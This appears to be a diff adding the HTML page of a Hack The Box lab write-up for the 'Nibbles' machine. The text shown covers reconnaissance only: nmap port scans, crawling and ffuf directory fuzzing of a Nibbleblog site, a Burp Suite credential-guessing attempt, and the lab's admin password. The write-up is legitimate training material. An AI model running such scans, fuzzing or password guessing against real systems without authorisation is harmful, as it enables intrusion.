@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;nibbles#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Nibbles<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-02-25</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#host-10-10-10-75">Host 10.10.10.75</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#apache">Apache</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#foothold-cve-2015-6967">Foothold (CVE-2015-6967)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#checks">Checks</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#home-folders">Home folders</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#inspecting-home-nibbler-personal-zip">Inspecting &#x2F;home&#x2F;nibbler&#x2F;personal.zip</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#inspecting-tmp-personal-stuff-monitor-sh">Inspecting &#x2F;tmp&#x2F;personal&#x2F;stuff&#x2F;monitor.sh</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#sudo-permissions">Sudo permissions</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#preparation-1">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2018-01-13</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/2984">mrb3n</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.5</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-75">Host <code>10.10.10.75</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Nibbles using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.75<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.75<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.75<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Nibbles is running Linux, and the
+version of SSH suggests that it might be Ubuntu.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.75<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+</span><span class="z-text z-plain">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+</span><span class="z-text z-plain">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Site doesn&#39;t have a title (text/html).
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="apache">Apache</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.75/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-homepage.png" alt="Apache homepage" /></p>
+<p>It's a basic web page with the 'Hello world!' message.</p>
+<h4 id="source-code-review">Source code review</h4>
+<p>If we check the source code of the web page, we find this comment:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic"><span class="z-comment z-block z-html"><span class="z-punctuation z-definition z-comment z-begin z-html">&lt;!--</span> /nibbleblog/ directory. Nothing interesting here! <span class="z-punctuation z-definition z-comment z-end z-html">--&gt;</span></span>
+</span></code></pre>
+<p>It indicates that a <code>nibbleblog</code> directory exists at the root of the web
+server.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.75/nibbleblog/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-page.png" alt="Apache nibbleblog page" /></p>
+<p>It's a simple blog page.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-page-wappalyzer.png" alt="Apache nibbleblog page Wappalyzer extension" /></p>
+<p>This reveals that this web page is using PHP.</p>
+<p>Moreover, the footer of the page we discovered indicates that it's powered by
+Nibbleblog.</p>
+<blockquote>
+<p>Easy, fast and free CMS Blog. All you need is PHP to work.</p>
+<p>— <a href="https://github.com/dignajar/nibbleblog">GitHub</a></p>
+</blockquote>
+<h4 id="exploration-2">Exploration</h4>
+<p>Unfortunately, there's no posts and we can't do anything.</p>
+<h4 id="site-crawling">Site crawling</h4>
+<p>Let's see if we can find any linked web pages or directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.75/nibbleblog/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/css/page.css
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/css/normalize.css
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/css/plugins.css
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/css/post.css
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/feed.php
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/js/rainbow-custom.min.js
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/css/rainbow.css
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=uncategorised
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=videos
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=music
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/admin/js/jquery/jquery.js
+</span><span class="z-text z-plain">http://10.10.10.75/nibbleblog/themes/simpler/css/main.css
+</span></code></pre>
+<p>It reveals the existence of a <code>/nibbleblog/admin/</code> folder.</p>
+<h4 id="exploration-3">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.75/nibbleblog/admin/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-admin-folder.png" alt="Apache nibbleblog admin folder" /></p>
+<p>It contains a bunch of files and folders. I explored them, but they're mostly
+PHP files, so they get executed when I browse them. I believe that this folder
+holds the source code of the website.</p>
+<h4 id="directory-fuzzing">Directory fuzzing</h4>
+<p>Let's see if this website hides unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.75/nibbleblog/FUZZ<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>mc</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>100-403,405-599<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/,.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 200, Size: 402, Words: 33, Lines: 11, Duration: 47ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/sitemap.php
+</span><span class="z-text z-plain">    * FUZZ: sitemap.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 39ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/content
+</span><span class="z-text z-plain">| --&gt; | http://10.10.10.75/nibbleblog/content/
+</span><span class="z-text z-plain">    * FUZZ: content
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 1353, Words: 88, Lines: 19, Duration: 40ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/content/
+</span><span class="z-text z-plain">    * FUZZ: content/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 37ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/themes
+</span><span class="z-text z-plain">| --&gt; | http://10.10.10.75/nibbleblog/themes/
+</span><span class="z-text z-plain">    * FUZZ: themes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 1741, Words: 112, Lines: 21, Duration: 41ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/themes/
+</span><span class="z-text z-plain">    * FUZZ: themes/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 302, Words: 8, Lines: 8, Duration: 43ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/feed.php
+</span><span class="z-text z-plain">    * FUZZ: feed.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 37ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/admin
+</span><span class="z-text z-plain">| --&gt; | http://10.10.10.75/nibbleblog/admin/
+</span><span class="z-text z-plain">    * FUZZ: admin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 2127, Words: 136, Lines: 23, Duration: 49ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/admin/
+</span><span class="z-text z-plain">    * FUZZ: admin/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 53ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/admin.php
+</span><span class="z-text z-plain">    * FUZZ: admin.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 38ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/plugins
+</span><span class="z-text z-plain">| --&gt; | http://10.10.10.75/nibbleblog/plugins/
+</span><span class="z-text z-plain">    * FUZZ: plugins
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 3777, Words: 232, Lines: 31, Duration: 40ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/plugins/
+</span><span class="z-text z-plain">    * FUZZ: plugins/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 3988ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/index.php
+</span><span class="z-text z-plain">    * FUZZ: index.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 78, Words: 11, Lines: 1, Duration: 41ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/install.php
+</span><span class="z-text z-plain">    * FUZZ: install.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 1622, Words: 103, Lines: 88, Duration: 47ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/update.php
+</span><span class="z-text z-plain">    * FUZZ: update.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 36ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/README
+</span><span class="z-text z-plain">    * FUZZ: README
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 37ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/languages
+</span><span class="z-text z-plain">| --&gt; | http://10.10.10.75/nibbleblog/languages/
+</span><span class="z-text z-plain">    * FUZZ: languages
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 3167, Words: 208, Lines: 28, Duration: 38ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/languages/
+</span><span class="z-text z-plain">    * FUZZ: languages/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 43ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/.php
+</span><span class="z-text z-plain">    * FUZZ: .php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 2986, Words: 116, Lines: 61, Duration: 83ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog//
+</span><span class="z-text z-plain">    * FUZZ: /
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 2986, Words: 116, Lines: 61, Duration: 84ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.75/nibbleblog/
+</span><span class="z-text z-plain">    * FUZZ:
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We get a hit for various web pages.</p>
+<h4 id="exploration-4">Exploration</h4>
+<p>Let's browse to <code>http://10.10.10.75/nibbleblog/update.php</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-update-page.png" alt="Apache nibbleblog update page" /></p>
+<p>This page is interesting, because it leaks that the Apache server is using
+Nibbleblog version <code>4.0.3</code>.</p>
+<p>Now let's browse to <code>http://10.10.10.75/nibbleblog/admin.php</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/apache-nibbleblog-admin-page.png" alt="Apache nibbleblog admin page" /></p>
+<p>It's a login page! We may have access to more functionalities if we manage to
+log in.</p>
+<p>If we search online for Nibbleblog's default credentials, we find nothing.</p>
+<p>What about common credentials then? I launched a Cluster bomb attack on Burp
+Suite using
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
+for the usernames and
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
+for the passwords. Unfortunately, only the first 5 requests were tried, the
+server blacklists my IP after that.</p>
+<p>This is the hard part, and I had to look it up online. Somehow, you're supposed
+to guess that the credentials are <code>admin</code>:<code>nibbles</code>, and you have to find them
+within 5 attempts or else your IP gets blacklisted...</p>
